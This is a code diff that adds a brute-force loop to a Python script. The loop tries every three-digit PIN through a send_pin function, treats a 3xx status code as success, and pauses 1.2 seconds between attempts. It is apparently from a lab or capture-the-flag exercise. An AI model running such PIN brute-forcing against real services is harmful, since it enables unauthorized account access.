@@ -28,3 +28,22 @@ def send_pin(pin):
             response += data
 
     return response.decode()
+
+
+for pin_number in range(0, 1000):
+    pin = f"{pin_number:03d}"
+    print(f"\n🔎 Trying PIN: {pin}")
+    response = send_pin(pin)
+
+   
+    status_code = response.split()[1]
+
+    print(f"📩 Status Code: {status_code}")
+
+    
+    if status_code.startswith('3'):
+        print(f"\n✅ Correct PIN found: {pin}")
+        break
+
+    
+    time.sleep(1.2)
